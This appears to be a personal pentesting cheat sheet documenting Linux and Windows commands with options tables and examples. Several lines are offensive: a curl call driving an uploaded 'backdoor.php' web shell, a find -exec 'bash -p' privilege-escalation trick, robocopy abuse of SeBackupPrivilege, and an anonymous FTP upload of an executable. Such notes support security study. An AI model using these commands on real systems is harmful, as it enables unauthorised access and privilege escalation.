
# Misc - Sort

## eog
Image viewer
## strings
Show strings from w/in a file
## tee
Add an output

Ex:   Perform nmap smb vuln scan, then send to stdout AND save to a file
```bash
sudo nmap -p 139,445  --script=smb* <ip> | tee smb.log
```

# telnet


# xxd


# icacls


# robocopy

Robust File Copy for Windows (Can be used to abuse the *SeBackupPrivilege* and *SeRestorePrivilege*)

Usage
```powershell
robocopy [OPTIONS] [SOURCE] [DESTINATION]
```

/b|Copies files in backup mode. In backup mode, robocopy overrides file and folder permission settings (ACLs), which might otherwise block access.


# cron


# getcap
must be run from `/usr/sbin/getcap`






# apt
#linuxCmd #pkgInstaller

Advanced Package Tool  
  
Complete package management system that recursively installs, removes, or updates the requested package by recursively satisfying its requirements and dependencies.  
A package is an archive file containing multiple _.deb_ files. **dpkg** will install directly from the _.deb_ file, but miss dependencies whereas **apt** will not.  
  
When updating or installing a program, the system queries the software repositories (_/etc/apt/sources.list_) for the desired package.  

| Options  |                             |
| :--------: | --------------------------- |
| **apt-cache search**              | Displays all/ given package information stored in the internal cache database/ repository - Keywords given will match via description not its name.|
| **autoremove**                    | Removes packages that were automatically installed to satisfy dependencies for other packages and are now no longer needed                          |
| **-f / --fix-broken** **install** | Fixes missing package dependencies and repairs existing installs                                                                                    |
| **--fix-missing** **update**      | Ignores missing package dependencies                                                                                                                |
| **list**                          | Lists packages                                                                                                                                      |
| **--installed**                   | List all installed packages                                                                                                                         |
| **purge**                         | Uninstalls package data and its config files                                                                                                        |
| **remove**                        | Uninstalls package data, but will leave behind user config files and dependencies                                                                   |
| **--purge**                       | Also removes config files                                                                                                                           |
| **show** _package_                | Displays information about the package's dependencies, installation size, the package source, etc.                                                  |
| -**update**                       | Update the cached list of available packages, including information related to their versions, descriptions, etc.                                   |
| -**upgrade**                      | Upgrade installed packages (or given packages) and core systems to the latest versions                                                              |

If there's an "...invalic... not yet valid for x time" error, try:
```bash
sudo apt -o Acquire::Check-Valid-Until=false -o Acquire::Check-Date=false update
```


# arp
#linuxCmd #networkEnum

Prints content of ARP table

| Options |                                                                 |
|:-------:| --------------------------------------------------------------- |
| **-a**  | Uses BSD style output formatting (no fixed columns)             |
| **-e**  | Uses default Linux style output formatting (with fixed columns) |
| **-n**  | Uses numerical addresses rather than symbolic names             |
| **-v**  | Verbose                                                         |


# awk
#linuxCmd #textProcessing

A programming language designed for text processing and is typically used as a data extraction and reporting tool.  
Can have multiple character delimiter.  
  
| Options  |                      |
|:--------:| -------------------- |
| **$**_n_ | Denotes field number |
|  **-F**  | Field separator      |

```bash
echo "hello::there::friend" | awk -F "::" '{print $1, $3}'  
	hello friend
```

Sort file text by length:
```bash
awk '{print length(), $0 | "sort -n"}' values_and_flags.txt
```


# axel
#linuxCmd #dataTransfer

Download accelerator that transfers a file from a FTP or HTTP server through multiple connections.  

|  Options   |                                                   |
|:----------:| ------------------------------------------------- |
|   **-a**   | More consise progress indicator                   |
| **-n** _x_ | Specifies x number of connections to use          |
|   **-o**   | Allows saving file to given directory/ file name. |


# comm
#linuxCmd #fileProcessing 

Compares two text files, displaying the lines that are unique to each one, as well as the lines they have in common. It outputs three space-offset columns:  
the first contains lines that are unique to the first file or argument;  
the second contains lines that are unique to the second file or argument;  
the third column contains lines that are shared by both files.  
  
| Options  |                             |
|:--------:| --------------------------- |
| **-**_n_ | Suppress line _n_ in output |


# compgen
#linuxCmd #userRecon

Used to list all the commands that could be executed within the Linux system.
	(see **[sudo -l](OS%20Commands.md#sudo)**)

| Options |                                                       |
|:-------:| ----------------------------------------------------- |
| **-a**  | Display all bash shell aliases available to your user |
| **-b**  | Display all bash built-ins                            |
| **-c**  | Display all commands available to your user           |
| **-k**  | Display all bash keywords                             |


# curl
#linuxCmd #winCmd #dataTransfer

Transfer data to or from a server using a host of protocols including IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, etc

|         Options         |                                                                      |
|:-----------------------:| -------------------------------------------------------------------- |
|         **-A**          | Set User-Agent                                                       |
| **-b** _name=value_ | Sets cookie to _name=value_ pair                                     |
|         **-d**          | Sends specified data in a POST request                               |
|         **-H**          | Set request headers*                                                 |
|         **-I**          | Grab headers only (sends HEAD request)                               |
|         **-i**          | Display headers and the response body (sends any request we specify) |
|         **-k**          | Skip TLS/ SSL cert check                                             |
|         **-o**          | Allows saving file to given directory/ file name                     |
|         **-X**          | Specify custom request method                                        |
|         **-v**          | Verbose. Allows viewing of full HTTP request and response            |
|  **-u** _username:pw_   | Login                                                                |
##### Setting the Content-Type so the webserver knows we're sending form data:
```bash
-H “Content-Type: application/x-www-form-urlencoded”
```

##### Add URL encoding
```bash
curl http://192.168.139.11/project/uploads/users/backdoor.php --data-urlencode "cmd=which nc"
```

# cut
#linuxCmd #textProcessing 

Extract a section of text from a line and output it to STDOUT  
Can only use a single character delimiter  

|  Options  |             |
|:-------:| ----------- |
|**-d**|Denotes field delimiter|
|**-f**|Denotes field number

```bash
echo "I hack binaries,web apps,mobile apps, and just about anything else"| cut -f 2 -d ","  
web apps  
  
cut -d ":" -f 1 /etc/passwd   
root   
daemon   
bin   
....
```


# diff
#linuxCmd #fileProcessing 

Detect differences between files, similar to [**comm**](#comm), but more complex and supports many output formats.  
**-** indicator signals the line unique to the first file  
**+** indicator signals the line unique to the second file  

| Options |                                                               |
|:-------:| ------------------------------------------------------------- |
| **-c**  | Context format                                                |
| **-u**  | Unified format - does not show lines that match between files |


# dpkg
#linuxCmd #pkgInstaller

Core tool used to install a package, either directly or indirectly through **apt**. Used to install _.deb_ files  
Can be used offline. Will NOT install dependencies.  

| Options | |
| :-----: | ---- |
|**-i**|Install|
|**-r**|Remove|
|**-P**|Purge|


# env
#linuxCmd #terminalEnv #envRecon

Display [environment variables](Env%20Vars.md) within current Bash shell


# export
#linuxCmd #terminalEnv

Define variables within Bash terminal that are accessable to any subprocesses spawned from current Bash instance. Use **$** to reference the variable.  
  
Adding an [environment variable](Env%20Vars.md) without export it will only be available in the current shell.

```bash
export victim_ip=10.11.1.220  
ping -c 4 $victim_ip
```


# find
#linuxCmd #envRecon #fileProcessing 

Searches for given files and directories    
  
|      Addts      |                                   |                                                                                                                                                |
| :-------------: | --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| **2>/dev/null** | Sinkholes stderr messages to null |                                                                                                                                                |
|    **-exec**    |                                   |                                                                                                                                                |
|                 | **{}**                            | Ran w/ **exec**.  A placeholder for any *find* results.<br>Expands command to the filename of each of the files/ directories found by **find** |
|                 | **\;**                            | Ends command ran by **exec**. Must be escaped (hence **\\**). Runs command per file                                                            |
|                 | **+**                             | Ends command ran by **exec**. Appends found files to end of the command so command is run only once. More efficient than **\;**                |
|                 | -p                                | *Set Builtin* parameter which prevents the effective user from being reset                                                                     |
  
```bash
find / -size 64c -exec grep -Hi base64 {} \;
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;   #<--NOTE privesc
```


|         Options          |                                                                                                                  |
|:------------------------:| ---------------------------------------------------------------------------------------------------------------- |
|      **-mmin** _n_       | Searches for files modified >,<,= _n_ minutes ago ( +_n_ for greater than, -_n_ for less than, _n_ for exactly)  |
|      **-mtime** _n_      | Searches for files modified >,<,= _n_ * 24 hrs ago ( +_n_ for greater than, -_n_ for less than, _n_ for exactly) |
|     **-perm** _mode_     | File's [permission bits](Perms.md) are exactly set to _mode_                                                     |
|       **-**_mode_        | **All** file's permission bits are set to _mode_                                                                     |
|       **/**_mode_        | **Any** file's permission bits are set to _mode_                                                                     |
|        **-empty**        | Finds all empty files and directories                                                                            |
| **-type** **d**_/_ **f** | Only match directories/ files.                                                                                   |
|       **-delete**        | Delete files. Always put this option at the end of the find command                                              |

  
Looks for files/ dirs with the SUID bit set:
```bash
find / -perm -u=s.....
```



# ftp
File Transfer Protocol  
**Ports**
- 20 - Data  
- 21 - Control  
## Passive mode
#### Linux
- `passive`
#### Win  
- `quote pasv`


### Example Linux - Use active mode, binary transfer, put .exe
```bash
ftp 192.168.216.53   
	Connected to 192.168.216.53.
	220 Microsoft FTP Service
	Name (192.168.216.53:kali): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password: 
	230 User logged in.
	Remote system type is Windows_NT.
ftp> passive
	Passive mode: off; fallback to active mode: off.
ftp> binary
	200 Type set to I.
ftp> put SpotifySetup.exe
	local: SpotifySetup.exe remote: SpotifySetup.exe
	200 EPRT command successful.
	125 Data connection already open; Transfer starting.
	100% |*****************************************************************************|   972 KiB    1.00 MiB/s    00:00 ETA
	226 Transfer complete.
	995840 bytes sent in 00:01 (946.07 KiB/s)
```

## Windows cmdline

| Options       | Desc                                                                                                                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -v            | Suppresses verbose display of remote server responses.                                                                                                                               |
| -n            | Suppresses auto-login upon initial connection.                                                                                                                                       |
| -i            | Turns off interactive prompting during multiple file transfers.                                                                                                                      |
| -d            | Enables debugging, displaying all ftp commands passed between the client and server.                                                                                                 |
| -g            | Disables filename globbing, which permits the use of wildcard characters in local file and path names.                                                                               |
| -s:filename   | Specifies a text file containing ftp commands; the commands automatically run after ftp starts. No spaces are allowed in this parameter. Use this switch instead of redirection (>). |
| -a            | Use any local interface when binding data connection.                                                                                                                                |
| -w:windowsize | Overrides the default transfer buffer size of 4096.                                                                                                                                  |
| computer      | Specifies the computer name or IP address of the remote computer to connect to. The computer, if specified, must be the last parameter on the line.                                  |

####  FTP cmds once connected

| FTP Command | Description of Command                                                                                                                                                                                                                                                                                             |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| !           | This command toggles back and forth between the operating system and ftp. Once back in the operating system, typing exit takes you back to the FTP command line.                                                                                                                                                   |
| ?           | Accesses the Help screen.                                                                                                                                                                                                                                                                                          |
| append      | Append text to a local file.                                                                                                                                                                                                                                                                                       |
| ascii       | Switch to ASCII transfer mode.                                                                                                                                                                                                                                                                                     |
| bell        | Turns bell mode on or off.                                                                                                                                                                                                                                                                                         |
| binary      | Switches to binary transfer mode.                                                                                                                                                                                                                                                                                  |
| bye         | Exits from FTP.                                                                                                                                                                                                                                                                                                    |
| cd          | Changes directory.                                                                                                                                                                                                                                                                                                 |
| close       | Exits from FTP.                                                                                                                                                                                                                                                                                                    |
| delete      | Deletes a file.                                                                                                                                                                                                                                                                                                    |
| debug       | Sets debugging on or off.                                                                                                                                                                                                                                                                                          |
| dir         | Lists files, if connected. dir -C = lists the files in wide format. dir -1 = Lists the files in bare format in alphabetic order. dir -r = Lists directory in reverse alphabetic order. dir -R = Lists all files in current directory and sub directories. dir -S = Lists files in bare format in alphabetic order. |
| disconnect  | Exits from FTP.                                                                                                                                                                                                                                                                                                    |
| get         | Get file from the remote computer.                                                                                                                                                                                                                                                                                 |
| glob        | Sets globbing on or off. When turned off, the file name in the put and get commands is taken literally, and wildcards will not be looked at.                                                                                                                                                                       |
| hash        | Sets hash mark printing on or off. When turned on, for each 1024 bytes of data received, a hash-mark (#) is displayed.                                                                                                                                                                                             |
| help        | Accesses the Help screen and displays information about the command if the command is typed after help.                                                                                                                                                                                                            |
| lcd         | Displays local directory if typed alone or if path typed after lcd will change the local directory.                                                                                                                                                                                                                |
| literal     | Sends a literal command to the connected computer with an expected one-line response.                                                                                                                                                                                                                              |
| ls          | Lists files of the remotely connected computer.                                                                                                                                                                                                                                                                    |
| mdelete     | Multiple delete.                                                                                                                                                                                                                                                                                                   |
| mdir        | Lists contents of multiple remote directories.                                                                                                                                                                                                                                                                     |
| mget        | Get multiple files.                                                                                                                                                                                                                                                                                                |
| mkdir       | Make directory.                                                                                                                                                                                                                                                                                                    |
| mls         | Lists contents of multiple remote directories.                                                                                                                                                                                                                                                                     |
| mput        | Send multiple files.                                                                                                                                                                                                                                                                                               |
| open        | Opens address.                                                                                                                                                                                                                                                                                                     |
| prompt      | Enables or disables the prompt.                                                                                                                                                                                                                                                                                    |
| put         | Send one file.                                                                                                                                                                                                                                                                                                     |
| pwd         | Print working directory.                                                                                                                                                                                                                                                                                           |
| quit        | Exits from FTP.                                                                                                                                                                                                                                                                                                    |
| quote       | Same as the literal command.                                                                                                                                                                                                                                                                                       |
| recv        | Receive file.                                                                                                                                                                                                                                                                                                      |
| remotehelp  | Get help from remote server.                                                                                                                                                                                                                                                                                       |
| rename      | Renames a file.                                                                                                                                                                                                                                                                                                    |
| rmdir       | Removes a directory on the remote computer.                                                                                                                                                                                                                                                                        |
| send        | Send single file.                                                                                                                                                                                                                                                                                                  |
| status      | Shows status of currently enabled and disabled options.                                                                                                                                                                                                                                                            |
| trace       | Toggles packet tracing.                                                                                                                                                                                                                                                                                            |
| type        | Set file transfer type.                                                                                                                                                                                                                                                                                            |
| user        | Send new user information.                                                                                                                                                                                                                                                                                         |
| verbose     | Sets verbose on or off.                                                                                                                                                                                                                                                                                            |

## Linux/ Unix cmdline

| Options | Desc                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -4      | Use only IPv4 to contact any host.                                                                                                                                                                                                                                                                                                                                                                                                 |
| -6      | Use IPv6 only.                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -e      | Disables command editing and history support, if it was compiled into the ftp executable. Otherwise, it does nothing.                                                                                                                                                                                                                                                                                                              |
| -p      | Use passive mode for data transfers. Allows the use of ftp in environments where a firewall prevents connections from the outside world back to the client machine. Requires the ftp server to support the PASV command.                                                                                                                                                                                                           |
| -i      | Turns off interactive prompting during multiple file transfers.                                                                                                                                                                                                                                                                                                                                                                    |
| -n      | Restrains ftp from attempting auto-login upon initial connection. If auto-login is enabled, ftp checks the .netrc (see netrc ) file in the user’s home directory for an entry describing an account on the remote machine. If no entry exists, ftp prompts for the remote machine login name (the default is the user identity on the local machine), and, if necessary, prompt for a password and an account with which to login. |
| -g      | Disables file name globbing.                                                                                                                                                                                                                                                                                                                                                                                                       |
| -v      | The verbose option forces ftp to show all responses from the remote server, as well as report on data transfer statistics.                                                                                                                                                                                                                                                                                                         |
| -d      | Enables debugging.                                                                                                                                                                                                                                                                                                                                                                                                                 |

####  FTP cmds once connected

| FTP Command | Description of Command                               |
| ----------- | ---------------------------------------------------- |
| !           | Escape to the shell.                                 |
| $           | Execute macro                                        |
| ?           | Print local help information.                        |
| account     | Send account command to remote server.               |
| append      | Append to a file.                                    |
| ascii       | Set ascii transfer type.                             |
| beep        | Beep when command completed.                         |
| binary      | Set binary transfer type.                            |
| bye         | Terminate FTP session and exit.                      |
| case        | Toggle mget upper/lower case id mapping.             |
| cd          | Change remote working directory.                     |
| cdup        | Change remote working directory to parent directory. |
| chmod       | Change file permissions of remote file.              |
| close       | Terminate FTP session.                               |
| cr          | Toggle carriage return stripping on ascii gets.      |
| debug       | Toggle/set debugging mode.                           |
| delete      | Delete remote file                                   |
| dir         | List contents of remote directory.                   |
| disconnect  | Terminate FTP session.                               |
| exit        | Terminate FTP sessions and exit.                     |
| form        | Set file transfer format.                            |
| get         | Receive file.                                        |
| glob        | Toggle meta character expansion of local file names. |
| hash        | Toggle printing ‘#’ for each buffer transferred.     |
| help        | Display local help information.                      |
| idle        | Get (set) idle timer on remote side.                 |
| image       | Set binary transfer type.                            |
| ipany       | Allow use of any address family.                     |
| ipv4        | Restrict address usage to IPv4.                      |
| ipv6        | Restrict address usage to IPv6.                      |
| lcd         | Change local working directory.                      |
| ls          | List contents of remote directory.                   |
| macdef      | Define a macro.                                      |
| mdelete     | Delete multiple files.                               |
| mdir        | List contents of multiple remote directories.        |
| mget        | Get multiple files.                                  |
| mkdir       | Make directory on remote machine.                    |
| mls         | List contents of multiple remote directories.        |
| mode        | Set file transfer mode.                              |
| modtime     | Show last modification time of remote file.          |
| mput        | Send multiple files.                                 |
| newer       | Get file if remote file is newer than local file.    |
| nlist       | List remote directory nlist contents.                |
| nmap        | Set templates for default file name mapping.         |
| ntrans      | Set translation table for default file name mapping. |
| open        | Connect to remote ftp.                               |
| passive     | Enter passive transfer mode.                         |
| prompt      | Force interactive prompting on multiple commands.    |
| proxy       | Issue command on an alternate connection.            |
| put         | Send one file.                                       |
| pwd         | Print working directory on remote machine.           |
| qc          | Print ? in place of control characters on stdout.    |
| quit        | Terminate ftp session and exit.                      |
| quote       | Send arbitrary ftp command.                          |
| recv        | Receive file.                                        |
| reget       | Get file restarting at end of local file.            |
| rename      | Rename file.                                         |
| reset       | Clear queued command replies.                        |
| restart     | Restart file transfer at bytecount.                  |
| rhelp       | Get help from remote server.                         |
| rmdir       | Remove directory on remote machine.                  |
| rstatus     | Show status of remote machine.                       |
| runique     | Toggle store unique for local files.                 |
| send        | Send one file.                                       |
| sendport    | Toggle use of PORT cmd for each data connection.     |
| site        | Send site specific command to remote server.         |
| size        | Show size of remote file.                            |
| status      | Show current status.                                 |
| struct      | Set file transfer structure.                         |
| sunique     | Toggle store unique on remote machine.               |
| system      | Show remote system type.                             |
| tenex       | Set tenex file transfer type.                        |
| tick        | Toggle printing byte counter during transfers.       |
| trace       | Toggle packet tracing.                               |
| type        | Set file transfer type.                              |
| umask       | Get (set) umask on remote site.                      |
| user        | Send new user information.                           |
| verbose     | Toggle verbose mode.                                 |

# grep
#linuxCmd #textProcessing #fileProcessing

Searches text files for the occurence of a given regex and displays results to STDOUT  

|  Options   |                                                                                                                             |
|:----------:| --------------------------------------------------------------------------------------------------------------------------- |
| **-A** _n_ | Display result and _n_ lines after                                                                                          |
| **-B** _n_ | Display result and _n_ lines before                                                                                         |
|   **-H**   | Show file name                                                                                                              |
|   **-i**   | Ignore text case                                                                                                            |
|   **-o**   | Useful w/ regex. Print only the matched (non-empty) parts of a matching line, with each such part on a separate output line |
|   **-r**   | Recursive searching                                                                                                         |
|   **-s**   | Suppress errors                                                                                                             |
|   **-v**   | Return all non-matching lines                                                                                               |
|   **-x**   | Equivalent to wrapping with regex of **^** and **$**                                                                        |
|   **^**    | Beginning of line                                                                                                           |
|   **$**    | End of line                                                                                                                 |

Similar to Win [**findstr**](OS%20Commands.md#findstr)


# history
#linuxCmd #terminalEnv #envRecon 

Display history of Bash commands. Operation of **history** can be changed by different [environment variables](Env%20Vars.md)

# ip
#linuxCmd #networkEnum 

Utility to show or manipulate routing, network devices, interfaces and tunnels.

Ethernet connections only.  For wireless use [*iwconfig*](OS%20Commands.md#iwconfig)

| Options |                                                                          |
|:-------:| ------------------------------------------------------------------------ |
|  **a**  | Show all                                                                 |
|  **n**  | Display ARP table (can also use [*arp*](OS%20Commands.md#arp) command) |
|  **r**  | Displays Route table (can also use [*route*](OS%20Commands.md#route) command)          |

|      Cmd       | Replacement For |
|:--------------:|:---------------:|
|  **ip route**  | **netstat -r**  |
| **ip -s link** | **netstat -i**  |
|  **ip maddr**  | **netstat -g**  |

# iptables
#linuxCmd #networkManipulation 

Administration tool for IPv4 packet filtering and NAT

| Options            | Desc                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A                  | Append this rule to a rule chain. Valid chains for what we're doing are INPUT, FORWARD and OUTPUT, but we mostly deal with INPUT in this tutorial, which affects only incoming traffic.                                                                                                                                                                                                                                                                                           |
| -L                 | List the current filter rules.                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| -m conntrack       | Allow filter rules to match based on connection state. Permits the use of the --ctstate option.                                                                                                                                                                                                                                                                                                                                                                                   |
| --ctstate          | Define the list of states for the rule to match on. Valid states are:<br>&nbsp;&nbsp;&nbsp;&nbsp;NEW - The connection has not yet been seen.<br>&nbsp;&nbsp;&nbsp;&nbsp;RELATED - The connection is new, but is related to another connection already permitted.<br>&nbsp;&nbsp;&nbsp;&nbsp;ESTABLISHED - The connection is already established.<br>&nbsp;&nbsp;&nbsp;&nbsp;INVALID - The traffic couldn't be identified for some reason.                                                                                                                                         |
| -m limit           | Require the rule to match only a limited number of times. Allows the use of the --limit option. Useful for limiting logging rules.<br>--limit - The maximum matching rate, given as a number followed by "/second", "/minute", "/hour", or "/day" depending on how often you want the rule to match. If this option is not used and -m limit is used, the default is "3/hour".                                                                                                    |
| -p                 | The connection protocol used.                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| --dport            | The destination port(s) required for this rule. A single port may be given, or a range may be given as start:end, which will match all ports from start to end, inclusive.                                                                                                                                                                                                                                                                                                        |
| -j                 | Jump to the specified target. By default, iptables allows four targets:<br>&nbsp;&nbsp;&nbsp;&nbsp;ACCEPT - Accept the packet and stop processing rules in this chain.<br>&nbsp;&nbsp;&nbsp;&nbsp;REJECT - Reject the packet and notify the sender that we did so, and stop processing rules in this chain.<br>&nbsp;&nbsp;&nbsp;&nbsp;DROP - Silently ignore the packet, and stop processing rules in this chain.<br>&nbsp;&nbsp;&nbsp;&nbsp;LOG - Log the packet, and continue processing more rules in this chain. Allows the use of the --log-prefix and --log-level options. |
| --log-prefix       | When logging, put this text before the log message. Use double quotes around the text to use.                                                                                                                                                                                                                                                                                                                                                                                     |
| --log-level        | Log using the specified syslog level. 7 is a good choice unless you specifically need something else.                                                                                                                                                                                                                                                                                                                                                                             |
| -i                 | Only match if the packet is coming in on the specified interface.                                                                                                                                                                                                                                                                                                                                                                                                                 |
| -I                 | Inserts a rule. Takes two options, the chain to insert the rule into, and the rule number it should be.<br>&nbsp;&nbsp;&nbsp;&nbsp;-I INPUT 5 would insert the rule into the INPUT chain and make it the 5th rule in the list.                                                                                                                                                                                                                                                                            |
| -v                 | Display more information in the output. Useful for if you have rules that look similar without using -v.                                                                                                                                                                                                                                                                                                                                                                          |
| -s --source        | address\[/mask] source specification                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -d --destination   | address\[/mask] destination specification                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| -o --out-interface | output name\[+] network interface name (\[+] for wildcard)                                                                                                                                                                                                                                                                                                                                                                                                                        |

# iwconfig
#linuxCmd #networkEnum 

Shows wireless networking connections.   For ethernet, use [*ip*](OS%20Commands.md#ip) or *ipconfig*


# kill
#linuxCmd #processes

Sends signal to process for given PID  
  
Default signal sent is SIGTERM (request termination)  

|          Options           |                                                                                           |                                   |
|:--------------------------:| ----------------------------------------------------------------------------------------- | --------------------------------- |
| **-** _signal_ OR **-s** _ | Send specified _signal_ by signal number or name                                          | ex: **-9** - Force kill (SIGKILL) |
|           **-l**           | List signal names. When given optional argument, will convert signal name ↔ signal number |                                   |
|           **-L**           | List signals in a tabular format                                                          |                                   |

  
Available Signals:  
1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP  
6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1  
11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM  
16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP  
21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ  
26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR  
 ?) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3  
 ?) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8  
 ?) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13  
 ?) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12  
 ?) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7  
 ?) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2  
63) SIGRTMAX-1 64) SIGRTMAX

# locate
#linuxCmd #envRecon #fileProcessing 

Searches filesystem for files and directories for a given pattern. Consults locate.db which is updated regularly by **cron** and manually with **updatedb**

# ls
#linuxCmd #fileProcessing #envRecon 

Prints basic file listing  
  
| Options |                                                                        |
|:-------:| ---------------------------------------------------------------------- |
| **-1**  | Displays each file on a single line                                    |
| **-a**  | Show all files                                                         |
| **-h**  | Human readable (w/ **-l** and **-s**, show sizes like 1K, 3M, 2G, etc) |
| **-i**  | Show inode number                                                      |
| **-l**  | Long listing format                                                    |
| **-t**  | Sort by last modified date and time                                    |
| **-r**  | Reverse sorting by modified date and time                              |



# lsblk
#linuxCmd #deviceEnum

List block devices.  

|               Options               |                                                                                                                               |
|:-----------------------------------:| ----------------------------------------------------------------------------------------------------------------------------- |
|        **-A**, **--noempty**        | Don’t print empty devices                                                                                                     |
|            **-a**, --all            | Disable all built-in filters and list all empty devices and  RAM disk devices too                                             |
|           **-b**, --bytes           | Print the sizes in bytes rather than in a human-readable format*                                                              |
|        **-D**, **--discard**        | Print information about the discarding capabilities (TRIM, UNMAP) for each device                                             |
|        **-d**, **--nodeps**         | Do not print holder devices or slaves. For example, lsblk                                                                     |
|        **--nodeps /dev/sda**        | Prints information about the sda device only                                                                                  |
|       **-E**, --dedup column        | Use _column_ as a de-duplication key to de-duplicate output tree\*\*                                                          |
|    **-e**, **--exclude** _list_     | Exclude the devices specified by the comma-separated list of major device numbers\*\*\*                                       |
|            **-f**, --fs             | Output info about filesystems\*\*\*\*                                                                                         |
|       **-I**, --include list        | Include devices specified by the comma-separated list of major device numbers\*\*\*\*\*                                       |
|         **-i**, **--ascii**         | Use ASCII characters for tree formatting                                                                                      |
|         **-J**, **--json**          | Use JSON output format. It’s strongly recommended to use **--output** and also **--tree** if necessary                        |
|         **-l**, **--list**          | Produce output in the form of a list\*\*\*\*\*\*                                                                              |
|           **-M**, --merge           | Group parents of sub-trees to provide more readable output for RAIDs and Multi-path devices. The tree-like output is required |
|         **-m**, **--perms**         | Output info about device owner, group and mode. This option is equivalent to **-o NAME,SIZE,OWNER,GROUP,MODE**.               |
|           **-N**, --nvme            | Output info about NVMe devices only                                                                                           |
|          **-v**, --virtio           | Output info about virtio devices only                                                                                         |
|        **-n**, --noheadings         | Do not print a header line                                                                                                    |
|        **-o**, --output list        | Specify which output columns to print                                                                                         |
|      **-O**, **--output-all**       | Output all available columns\+                                                                                                |
|           **-P**, --pairs           | Produce output in the form of key="value" pairs\+\+                                                                           |
|           **-p**, --paths           | Print full device paths                                                                                                       |
|            **-r**, --raw            | Produce output in raw format.\+\+\+                                                                                           |
|           **-S**, --scsi            | Output info about SCSI devices only. All partitions, slaves and holder devices are ignored                                    |
|          **-s**, --inverse          | Print dependencies in inverse order. If the --list output is requested then the lines are still ordered by dependencies       |
| **-T**, **--tree**\[**=**_column_\] | Force tree-like output format. If column is specified, then a tree is printed in the column. The default is NAME column       |
|         **-t**, --topology          | Output info about block-device topology                                                                                       |
|         **-h**, **--help**          | Display help text and exit                                                                                                    |
|          **-V**, --version          | Print version and exit                                                                                                        |
|       **-w**, --width number        | Specifies output width as a number of characters\+\+\+\+                                                                      |
|     **-x**, **--sort** _column_     | Sort output lines by column.  Default --list; can try --tree                                                                  |
|         **-y**, **--shell**         | The column name will be modified to contain only characters allowed for shell variable identifiers                            |
|           **-z**, --zoned           | Print the zone related information for each device                                                                            |
|       **--sysroot** directory       | Gather data for a Linux instance other than the instance from which the **lsblk** command is issued                           |


\* - By default, the unit, sizes are expressed in, is byte, and unit prefixes are in power of 2^10 (1024).
Abbreviations of symbols are exhibited truncated in order to reach a better readability, by exhibiting alone the first letter of them;  
	examples: "1 KiB" and "1 MiB" are respectively exhibited as "1 K" and "1 M", then omitting on purpose the mention "iB", which is part of these abbreviations.

\*\* - If the key is not available for the device, or the device is a partition and parental whole-disk device provides the same key than the device is always printed.
The usual use case is to de-duplicate output on system multi-path devices, for example by **-E WWN**.

\*\*\* - Note that RAM disks (major=1) are excluded by default if **--all** is not specified.
The filter is applied to the top-level devices only.
This may be confusing for **--list** output format where hierarchy of the devices is not obvious.

\*\*\*\* - This option is equivalent to **-o NAME,FSTYPE,FSVER,LABEL,UUID,FSAVAIL,FSUSE%,MOUNTPOINTS**.  
The authoritative information about filesystems and raids is provided by the [blkid(8)](https://man7.org/linux/man-pages/man8/blkid.8.html) command

\*\*\*\*\* - The filter is applied to the top-level devices only.
This may be confusing for **--list** output format where hierarchy of the devices is not obvious.

\*\*\*\*\*\* - The output does not provide information about relationships between devices and
since version 2.34 every device is printed only once if **--pairs** or **--raw** not specified (the parsable outputs are  
maintained in backwardly compatible way).

\+ - Use --help to get a list of all supported columns. The columns may affect  
tree-like output. The default is to use tree for the column 'NAME' (see also **--tree**).  
The default list of columns may be extended if _list_ is specified in the format _+list_ (e.g., **lsblk -o +UUID**).  
  
\+\+ - The output lines are still ordered by dependencies. All potentially unsafe value characters are hex-escaped (\x\<code\>).
See also option **--shell**.

\+\+\+ - The output lines are still ordered by dependencies.
All potentially unsafe characters are hex-escaped (\x\<code\>) in the NAME, KNAME, LABEL, PARTLABEL and MOUNTPOINT columns.

\+\+\+\+ - The default is the number of the terminal columns, and if not executed on a terminal, then output width is not restricted at all by default.
This option also forces lsblk to assume that terminal control characters and unsafe characters are not  allowed.
The expected use-case is for example when lsblk is used by the watch(1) command. 


# ltrace
#linuxCmd #processes 

Runs the specified command until it exits. 

It **intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process**.
It can also intercept and print the system calls executed by the program.

```bash
ltrace dpkg
```


# man
#linuxCmd #processes 

